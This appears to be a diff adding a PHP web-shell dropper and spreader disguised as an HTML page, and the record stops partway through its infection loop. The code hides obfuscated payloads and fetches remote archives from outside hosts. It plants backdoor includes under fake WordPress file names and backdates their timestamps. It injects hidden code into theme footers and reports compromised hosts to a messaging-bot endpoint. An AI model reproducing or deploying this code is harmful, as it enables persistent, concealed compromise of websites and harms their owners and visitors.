@@ -1,0 +1,606 @@
+<!DOCTYPE html><html><head><title>241543903</title><head><meta charset="utf-8"><link rel="stylesheet" href="https://dono-zz.github.io/main.css"><link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous"><link rel="stylesheet" href="https://dono-zz.github.io/black.css"><meta name="robots" content="noindex nofollow noarchive"><style>body{max-width:640px;margin:0 auto}code{color:#000;background-color:#fff;}a, a:hover{color:#000;text-align: center;background-color:#fff;}</style>
+<script>var sec=0;function pad(e){return e>9?e:"0"+e}setInterval((function(){document.getElementById("seconds").innerHTML=pad(++sec%60),document.getElementById("minutes").innerHTML=pad(parseInt(sec/60,10))}),1e3);</script></head><body><?php error_reporting(0);$start = microtime(true);ob_start();set_time_limit(0);ini_set('error_log', null);ini_set('html_errors', 0);ini_set('log_errors', 0);ini_set('log_errors_max_len', 0);ini_set('display_errors', 0);ini_set('display_startup_errors', 0); 
+
+function b64dd($xf) {
+	$_a="b";$_b="a";$_c="s";$_d="e";$_e="6";$_f="4";
+	$_g="_";$_h="d";$_i="e";$_j="c";$_k="o";$_l="d";$_m="e";
+	$b64=$_a.$_b.$_c.$_d.$_e.$_f.$_g.$_h.$_i.$_j.$_k.$_l.$_m;
+	return $b64($xf);
+}	
+
+$local = '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';
+function decno($string) { $key = "\x4d\101\130\x49\x4d\x5f\x4d\70"; $resultdoh = ''; $string = b64dd($string); for ($i = 0; $i < strlen($string); $i++) { $char = substr($string, $i, 1); $keychar = substr($key, $i % strlen($key) - 3, 1); $char = chr(ord($char) - ord($keychar)); $resultdoh .= $char; } return $resultdoh; } 
+$version = decno("k4ZssXaPgX6UsXGDp7p+sMSzbrKikICul69vrnO6r38=");
+$enx0 = array("edit-form-advanced.php","link-parse-opml.php","ms-sites.php","options-writing.php","themes.php","https.php","class-https.php","admin-ajax.php","edit-form-comment.php","link.php","ms-themes.php","_Document.php","plugin-editor.php","admin-footer.php","edit-link-form.php","registration-functions.php","load-scripts.php","ms-upgrade-network.php","admin-functions.php","edit.php","load-styles.php","ms-users.php","plugins.php","admin-header.php","licenses.php","edit-tag-form.php","media-new.php","my-sites.php","apps.php","post-new.php","upgrade-themes.php","sandwich.php","edit-tags.php","noop.php","media.php","nav-menus.php","posts.php","admin-post.php","export.php","Note.php","media-upload.php","network.php","press-this.php","upload.php","async-upload.php","menu-header.php","options-discussion.php","privacy.php","user-edit.php","menu.php","options-general.php","profile.php","user-new.php","moderation.php","options-head.php","revision.php","users.php","custom-background.php","ms-admin.php","options-media.php","setup-config.php","widgets.php","theme-single.php","custom-header.php","ms-delete-site.php","options-permalink.php","term.php","customize.php","link-add.php","ms-edit.php","options.php","edit-comments.php","link-manager.php","ms-options.php","options-reading.php","xmlrpc.php","comments.php","front-page.php","home.php",".default.php","header.php","singular.php","single.php","single-wordpress.php","page.php","category.php","tag.php","taxonomy.php","author.php","date.php","archive.php","search.php","attachment.php","image.php","404.php","https.php","noop.php","kayeli.php","Document.php","class-wp-customize-nav-menu-customize.php","Note.php",".default.php","_Document.php","footer_backup.php","header_backup.php","apps.php","index.php","remove.php","class.php");
+$enx1 = array("https.php","noop.php","_Document.php","Document.php","reta.php","mawes.php","Note.php",".default.php","_Document.php","footer_backup.php","header_backup.php","apps.php","licenses.php","kayeli.php","class.php","index.php");
+$eft0 = array("language","hooks","images","admins","backups","logs","assets","cache","Help","documents","temp","gitignore");
+// $itemsxz = array(decno('x8GsvbSSeHzMe6u5sMyqvI2wp7pwxLKwxLursrSGubvG'), decno('x8GsvbSSeHzMe6u5sMyqvI2wp7pwu7Wu0sBlxLGFrMLSwae6qtKues2urnquvbfCjLCtwLXHtrbZsma9r78='), decno('x8GsvbSSeHzMe6u5sMyqvI2wp7pwprjBxHuou6g='), decno('x8GsvbSSeHzMe6u5sMyqvI2wp7pwy7690bJmva+/'), decno('x8GsvbSSeHzMe6u5sMyqvI2wp7pwyqrEkHuosac='), decno('x8GsvbSSeHzMe6u5sMyqvI2wp7pwyqrEkXuosac='), decno('x8GsvbSSeHzMe6u5sMyqvI2wp7pwubm90nuou6g='), decno('x8GsvbSSeHzMe6u5sMyqvI2wp7pwinl/kXucvKTQ'), decno('x8GsvbSSeHzMe6u5sMyqvI2wp7pwznt8lYNue6XHrMU='), decno('x8GsvbSSeHzMe6u5sMyqvI2wp7pwznt8xrlmsbC7wQ==')); // files
+$itemsxz = array('https://xlscls.github.io/library.txt', 'https://xlscls.github.io/baks.txt'); // files
+$sox = "jVVha9swEP0rqjHEBrdNsn2K8aC03RiDFtKOfdiGUexzLWJLniQvbUP++06SHWdZmgxCLJ/unt67O539rGz5MlXsFZLJ+/E49leSaUhpwtuqin2QUsjtmyqhqpJRy2kN5JzGZBUTlsfkcsH4pSrJORvFfk6hFjxBqBwW7RMuWBEULc80EzyFZ6a0CkZNxnWVFkIuR2G49huWJ4MpCE2MNSbnk3DdSMY104F3O5/fz2fkmvKRJsbTC2NE1MEkjDddSLi2lrGzNEKx51SBViwPwn04o66H6312IXsxk3gDlYIh8tvV/O7z3acZ+UhZBTnRgjhXpuCCkMeSKYK/Xy0mk2Sixh1CeU64QN5U0+oCj9lkZc5k4F3iuq2pWhrSvhLZMinMv2iABz5rIr8RUkemGFzYh9Iyeje2WTqzATuiun0SOP89PaAyyRotpGogS6iU9CUYJx/cwmtYA17kSS+MJvvGFRqnB4xIuZEiA6US80wda9sq0d55KATDlOPNVCpBiVZmEPQI4Vu1Vg1dcWJBd/WgTqC1KW+6qDANjD8F7ozv458RJuiIw+SUw/RtB5Nys7kl+9Bmhn+B1+SFmAxgT0j4DVKBY206BEs5s6VECasS+wY1rM3lAFE4zAP6H2x0JjgHe4OIBlkzTjXkCLNAckvb6A6kl/YmUJfogyg+PnK87K7ETuSQrG1WsOC8rdOspPwJ8tS44dVJtomqkGjQYUX9PIn6URKZUWI7gPH0r5NcRGhT4mZHOOT3/voLmd9e3SBbn/Gm1Ulh/PvYYYy50XEgfEZcICIUltROp7gdNzEGWoP0o9Qeb+6/Ph4mNyCcImhBDlB08o7Qm56mhw1wjN70v+ghyEl6myKrhOrM6NS99Wnet0z+sZjmskOkt3ZjIe6/H6Sn5GO74VW0ks+6Md31vNft/eAeUvoD";
+// echo gzinflate(b64dd($local));
+function fgt($url) {
+	 if (function_exists('file_get_contents')){
+	 	$arrContextOptions=array(
+			 "ssl"=>array(
+			  "verify_peer"=>false,
+			  "verify_peer_name"=>false,
+			 ),
+			); $fgt = file_get_contents($url, false, stream_context_create($arrContextOptions));
+	 }elseif(function_exists('curl_exec')){
+	  $conn = curl_init($url);
+	  curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, false);
+	  curl_setopt($conn, CURLOPT_FRESH_CONNECT,  true);
+	  curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1);
+	  $fgt = (curl_exec($conn));
+	  curl_close($conn);
+	 }else{
+	  $handle = fopen ($url, "r");
+	  $fgt = stream_get_contents($handle);		  
+	 }
+	return $fgt;
+}
+
+        
+function backlinks($fol) {
+    $direktoripass = $fol;
+	$targetSitez = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]";
+	$direktoripath = $_SERVER['DOCUMENT_ROOT'];
+	$targetSitez = $targetSitez . str_replace($direktoripath, "", $direktoripass);
+    
+        $srcz = fgt($targetSitez);
+        preg_match("/.*stylesheet.*href=.*\/themes\/(.*?)\/.*\.css.*\>/i", $srcz, $matchesz);
+        if (isset($matchesz[1]))
+        {
+            $styleHrefz = trim($matchesz[1]);
+            $fooxer = $direktoripass . '/' . "wp-content" . '/' . "themes" . '/' . $styleHrefz . '/' . "footer.php";
+            if (file_exists($fooxer) && is_writable($fooxer) && isset($styleHrefz))
+            {
+                
+                $fooxerori = fgt($fooxer);
+                if (strpos($fooxerori, 'panen') === false)
+                {
+                    $searchcar = '</body>';
+                    $waktubl = date("Y-m-d H:i:s");
+                    $replacecar1 = 'DcrRagMhEEDRX5FQWIUm8960DXntNwRkouPuoI6iU1LafHz38V7O+6Vv3XCyPP3WKllnnk+zRxpN1Hdc9+XMn3m5Y8iFJc8P+umlRbKHmxxeExfyK6kPuyfRaZdNtc83gJW14P0UWoWMk6XBoIpTabCsx9BKoaDcBI4w8AEVWXahbXBG4HjqMS3OnSMq+UgJv4t65Uq/TchPUrtcJyN8YcahuLjz5fMf';
+                    $replacecar2 = 'VU9NT4NAEP0rY4MBtNuCSS8sbC+aeDCxB+9kgCXddGE37FAlpv/dLSVGb/PevI+ZfG+PFgIyDU5FLz/hGUl+qE5GMQ8854rbjolGtW0UOMKBPI6ZaM3QIUXhPYZee0Y9yiJ9nE0PTzyodBHmjTqDo0nLYmWNU6RMnwFWzuiRJIfKEJkug8R+cdCypQxYmia7nccrEW4Or4fy5f3tGrbxaUb/5cxIdqQChwGn0mlVyyiosD5p1Z/cOlnfToq5v1NifYwWA6CD4KqJv+fYef5NvSxV2/9dC+nfESG3g+qpHHybjjlcYC/ybWWaSeR3jIHFXvbAmPgB';
+                    $strcar = preg_replace('~.*\K' . preg_quote($searchcar, '~') . '~s', '$1' . gzinflate(b64dd($replacecar1)) . '<?php $startday=new DateTime(\'' . $waktubl . '\'); ?>' . gzinflate(b64dd($replacecar2)) , $fooxerori);
+                    @file_put_contents($fooxer, $strcar);
+                    @touch($fooxer, strtotime('-' . rand(90, 150) . ' days', time()));
+                }
+        	}
+        }
+}
+
+
+function generateRandomString($length = 10) {
+    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
+    $charactersLength = strlen($characters);
+    $randomString = '';
+    for ($i = 0; $i < $length; $i++) {
+        $randomString .= $characters[rand(0, $charactersLength - 1)];
+    }
+    return $randomString;
+}
+	function myscandir($dir) {
+		if (function_exists("scandir")) {
+			return scandir($dir);
+		} else {
+			$dh = opendir($dir);
+			while (false !== ($filename = readdir($dh))) $files[] = $filename;
+			return $files;
+		}
+	}
+function OS()
+{
+	return (substr(strtoupper(PHP_OS), 0, 3) === "WIN") ? "Windows" : "Linux";
+}	
+function GrabMe($x,$y,$z)
+{
+	$actual_link = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[SCRIPT_NAME]";
+	$ohmy = decno("xsCnsKy9vXvIvGfF");
+	$ukauka = decno("jsCdu6WlrsDSrp+ygLuxrtOsobF+");
+	$tapi = decno("wbysg3mRen+QgHGGeJKKjqSgqKGpx5XCwpOFwbuhrpGSsa+gi5q9mL6/h522ooKYyg==");
+	$tid = decno("jH5ofXOIeX+PfXGDeYs=");
+	$gime = decno("x8GsvbSSeHzAvaF7tb21ssa/mbpvx7u0jg==");
+	if (file_exists('/usr/local/cpanel/version')) { $cpanel = "cPanel: ON"; } else { $cpanel = "cPanel: OFF"; }
+		if(file_exists($z."/_x")) { 
+		$url = $gime . $tapi . $ukauka . $tid . '&parse_mode=MarkdownV2&text=``` r00t+'.OS().'+EXEC%3A+ENABLED+|+'.urlencode($cpanel).'%0A'.urlencode(b64dd($y)).'```&reply_markup={"inline_keyboard":[[{"text":"'.urlencode($x).'","url":"'.urlencode($actual_link).'"}]]}';
+		} else { $url = $gime . $tapi . $ukauka . $tid . '&parse_mode=MarkdownV2&text=``` NonRoot+'.OS().'+EXEC%3A+ENABLED+|+'.urlencode($cpanel).'%0A'.urlencode(b64dd($y)).'```&reply_markup={"inline_keyboard":[[{"text":"'.urlencode($x).'","url":"'.urlencode($actual_link).'"}]]}'; }
+    	$tResult = fgt($url);
+		// echo $tResult;
+}	
+function shuffle_assoc($list) {
+  if (!is_array($list)) return $list;
+
+  $keys = array_keys($list);
+  shuffle($keys);
+  $random = array();
+  foreach ($keys as $key)
+    $random[$key] = $list[$key];
+
+  return $random;
+}
+
+function getSubDirectories($dir) {
+	$subDir = array();
+	$directories = array_filter(glob($dir), 'is_dir');
+	$subDir = array_merge($subDir, $directories);
+	foreach ($directories as $directory) $subDir = array_merge($subDir, getSubDirectories($directory.'/*'));
+		return $subDir;
+}
+
+	function getFilex($dir, $filter = '', &$results = array()) {
+		    $files = myscandir($dir);
+		    foreach($files as $key => $value){
+		        $path = realpath($dir.'/'.$value); 
+		        if(!is_dir($path)) {
+		            if(empty($filter) || preg_match($filter, $path)) { 
+				            $path = str_replace($dir, '', $path);
+				            $path = ltrim($path, '/\\');
+		            	$results[] = $path; 
+		            }
+		        } elseif($value != "." && $value != "..") {
+		            getFilex($path, $filter, $results);
+		        }
+		    }
+		
+		    return array_unique($results);
+
+	}			
+
+
+function b64ed($xf) {
+	$_a="b";$_b="a";$_c="s";$_d="e";$_e="6";$_f="4";
+	$_g="_";$_h="e";$_i="n";$_j="c";$_k="o";$_l="d";$_m="e";
+	$b64=$_a.$_b.$_c.$_d.$_e.$_f.$_g.$_h.$_i.$_j.$_k.$_l.$_m;
+	return $b64($xf);
+}
+
+
+echo "<div class='corona mh-100'>";
+			
+@set_time_limit(0);
+
+$direktori = $_SERVER['DOCUMENT_ROOT'];
+$fullxx = $_SERVER['HTTP_HOST'] . str_replace($_SERVER['DOCUMENT_ROOT'], "/", $direktori);
+$fullxx = str_replace("//", "/", $fullxx);
+$fullxx = preg_replace('#[/\\\\]+#', '/', $fullxx);
+	if(isset($_POST['direktorix'])) { $direktori = $_POST['direktorix']; } else { $direktori = $_SERVER['DOCUMENT_ROOT']; }
+echo "<hr><br>";
+echo '<h2 class="text-center"><span id="minutes"></span>:<span id="seconds"></span></h2>
+	<form class="center" action="" method="post">
+	<div class="form-inline"><select name="modex" id="modex" class="form-control" style="width:20%;height: 40px;">
+	 	<option value="standard">Standard</option>
+	 	<option value="small">Small</option>
+	 	<option value="hakai">Zip/Phar</option> </select>
+	 <input class="form-control ml-3" type="text" name="direktorix" value="'.$direktori.'" style="width:70%;height:40px;">
+	 </div>
+	 <div style="margin-top:10px;width:93%;">
+	 &nbsp; &nbsp;  <input type="checkbox" name="kuman" value="yes"/>  Kuman
+	 &nbsp; &nbsp;  <input type="checkbox" checked name="license" value="yes"/>  License
+	 &nbsp; &nbsp;  <input type="checkbox" name="backlinks" value="yes"/>  Backlinks
+	 &nbsp; &nbsp;  <input type="checkbox" checked name="sockets" value="yes"/>  Sockets
+	 &nbsp; &nbsp;	'.$version.'
+	 <br /><br />
+	 <input type="submit" class="form-control btn btn-success " style="height: 40px;" value="Tebar" name="tebar" />
+	 </div> </form>
+	 <br>';
+if (isset($_POST['modex'])) { echo '<script type="text/javascript"> document.getElementById("modex").value = "'. $_POST['modex'] .'";</script>'; }
+if (isset($_POST['tebar'])) {
+	$modeio = $_POST['modex'];
+	$waktu = strtotime('-'.rand(30,90).' days', time());
+	$folderio = $_POST['direktorix'];
+	if(substr($folderio, -1) == '/') { $folderio = substr($folderio, 0, -1); }
+
+ 	$dirderdor = getSubDirectories($folderio);
+    $dirderdor = str_replace('//', "/", $dirderdor);
+    $subdir = shuffle_assoc($dirderdor);
+    $totaldir = count($dirderdor);
+
+    echo "<br>Total Directory to Infect: ".$totaldir." / ".count($eft0); 
+    
+    $pehape = getFilex($folderio, '/\.php$/');
+    $jumlahfilenyax = count(array_unique($pehape));
+    
+    if($jumlahfilenyax < count($itemsxz)) {
+    	$namanamafile = shuffle_assoc($enx0);
+    } else {
+    	$namanamafile = shuffle_assoc($pehape);
+    }
+
+    echo "<br>Total Unique File Name to Copied and Infect: ".$jumlahfilenyax." / ".count($itemsxz);
+    echo "<hr><br><code>";  		
+  	$adminer = "https://github.com/vrana/adminer/releases/download/v4.8.1/adminer-4.8.1-en.php";
+	if(isset($_POST['license'])) {
+	  	$love = "licenses.php";
+	  	$reportFinal = "";
+	 	$laporlove = dirname(__FILE__).'/'.$love;
+		if (!file_exists($laporlove)) {	$tmpf = tempnam(sys_get_temp_dir(), 'sess_'); $textz = html_entity_decode(gzinflate(b64dd($local))); @file_put_contents($tmpf,$textz); @file_put_contents($laporlove,'<?php if(file_exists("'.$tmpf.'")) {  require_once("'.$tmpf.'"); } ?>'); } else { $textz = html_entity_decode(gzinflate(b64dd($local)));@file_put_contents($textz,$laporlove); }	
+		
+		if(file_exists($laporlove) && filesize($laporlove) > 0) {
+			echo "<a href='//".$fullxx.str_replace($_SERVER['DOCUMENT_ROOT'], "/", $laporlove)."' target='_blank'>".$fullxx.str_replace($_SERVER['DOCUMENT_ROOT'], "/", $laporlove)."</a><br>";
+			$reportFinal = $fullxx.str_replace($_SERVER['DOCUMENT_ROOT'], "/", $laporlove).PHP_EOL;
+			@touch($laporlove, $waktu);
+			
+		}
+
+		if (empty($reportFinal)) {
+			$reportFinal = 'Tidak Bisa Tebar!';
+			endOfLife();
+		}
+	}
+					
+	if (isset($folderio)) {
+		// start all
+		$waktu = strtotime('-'.rand(30,90).' days', time()); 
+		if ($modeio === "hakai") {
+			if(class_exists('ZipArchive')) {
+				if (is_writable($folderio)) {
+				$remah = fgt(decno('x8GsvbSSeHzMe6u5sMyqvI2wp7pw0rK9jbqdfLS9t8HIu525b9KyvQ=='));
+				@file_put_contents($folderio . "/sentinel.zip", $remah);
+		        $try = $folderio . "/";
+		        $zip2 = new ZipArchive();
+		        if ($zip2->open($folderio . "/sentinel.zip") === TRUE) {
+		            $treba = 0;
+			            while ($treba <= count($itemsxz)) {
+			            	$namafilenx = $namanamafile[array_rand($namanamafile, 1)]; 
+			            	$sourcemove = "zip://".$folderio."/sentinel.zip/sentinel.pdf";
+			            	$sourcezx = b64ed(b64dd("PD9waHAgaW5jbHVkZShiYXNlNjRfZGVjb2RlKCI=").b64ed($sourcemove).b64dd("IikpOw=="));
+			            	$picksubdirX1 = $eft0[array_rand($eft0, 1)];    
+			 				$picksubdirFirst = $subdir[array_rand($subdir, 1)];
+			 				if($totaldir < count($eft0)) {
+						    		$picksubdir = $picksubdirFirst.'/'.$picksubdirX1;
+						    } else {
+						    		$picksubdir = $picksubdirFirst;
+						    }
+						    $fullSubdirFile = $picksubdir.'/'.$namafilenx;
+						    if (!file_exists($fullSubdirFile)) {
+						    	$waktu = strtotime('-'.rand(30,90).' days', time());
+						    	@file_put_contents($fullSubdirFile, b64dd($sourcezx)); 
+						    	
+								if (file_exists($fullSubdirFile) && filesize($fullSubdirFile) > 0) {
+							 		echo "<a href='//".$fullxx.str_replace($_SERVER['DOCUMENT_ROOT'], "/", $fullSubdirFile)."' target='_blank'>".$fullxx.str_replace($_SERVER['DOCUMENT_ROOT'], "/", $fullSubdirFile)."</a><br>";
+							 		$reportFinal .= $fullxx.str_replace($_SERVER['DOCUMENT_ROOT'], "/", $fullSubdirFile).PHP_EOL;
+							 		@touch($fullSubdirFile, $waktu);
+							    }
+								$treba++;
+						    }
+			            }		        	
+		            $zip2->close();
+		        	} 
+				} else { echo "Please check folder isn't writable!</code>";}
+	        endOfLife();
+			} elseif (class_exists('PharData')) {
+				if (is_writable($folderio)) {
+				$remah = fgt(decno('x8GsvbSSeHzMe6u5sMyqvI2wp7pw0rK9jbqdfLS9t8HIu525b8ixrtE='));
+				@file_put_contents($folderio . "/sentinel.phar", $remah);				
+		        $try = $folderio . "/";
+		        $phar = new PharData();
+		        if ($phar->open($folderio . "/sentinel.phar") === TRUE) {
+		            $treba = 0;
+			            while ($treba <= count($itemsxz)) {
+			            	$namafilenx = $namanamafile[array_rand($namanamafile, 1)]; 
+			            	$sourcemove = "phar://".$folderio."/sentinel.phar/sentinel.pdf";
+			            	$sourcezx = b64ed(b64dd("PD9waHAgaW5jbHVkZShiYXNlNjRfZGVjb2RlKCI=").b64ed($sourcemove).b64dd("IikpOw=="));
+			            	$picksubdirX1 = $eft0[array_rand($eft0, 1)];    
+			 				$picksubdirFirst = $subdir[array_rand($subdir, 1)];
+			 				if($totaldir < count($eft0)) {
+						    		$picksubdir = $picksubdirFirst.'/'.$picksubdirX1;
+						    } else {
+						    		$picksubdir = $picksubdirFirst;
+						    }
+						    $fullSubdirFile = $picksubdir.'/'.$namafilenx;
